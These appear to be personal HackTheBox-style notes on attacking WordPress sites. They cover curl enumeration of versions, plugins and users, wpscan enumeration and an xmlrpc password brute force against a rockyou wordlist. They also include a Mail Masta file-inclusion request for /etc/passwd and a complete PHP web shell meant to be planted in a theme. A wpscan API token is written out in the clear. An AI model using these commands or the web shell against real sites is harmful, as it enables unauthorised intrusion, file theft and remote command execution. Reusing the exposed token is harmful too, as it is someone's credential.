# Common Information
- To get api token of wpscan: [WPSCAN](https://wpscan.com/profile/)
- [WordPress xmlrpc attacks](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)
## Directories
```bash
BlxckShaiiko@htb[/htb]$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```
## Users
- Administrator
- Editor
- AUtor
- Contributor
- Subscriber

# Enumeration
## Version PHP
Using this code
```bash
curl -s -X GET http://TARGET-IP |  grep '<meta name="generator"'
```
Another option is in CSS or JS
```bash
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
```
## Plugins
```bash
curl -s -X GET http://TARGET-IP | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```
## Themes
```bash
curl -s -X GET http://TARGET-IP | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```
## Directories
```bash
curl -s -X GET http://83.136.254.84:54956/wp-content/plugins/mail-masta/inc/flag.txt | html2text
```
## User
```bash
curl -s -I http://TARGET-IP/?author=1
curl http://TARGET-IP/wp-json/wp/v2/users | jq
```
## WPSCAM
### Enumerate
```bash
wpscan --url http://94.237.48.51:32588 --enumerate --api-token Zgus5KAsiK755cpYUNX2ba1KcsdIrIDEjnR5mkPGjzU
```
### Brute Force
```bash
wpscan --url http://94.237.48.51:32588 --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt 
```
# Common Attacks
## Mail Masta PLugin
```bash
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
## Themes Reverse Shell
```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
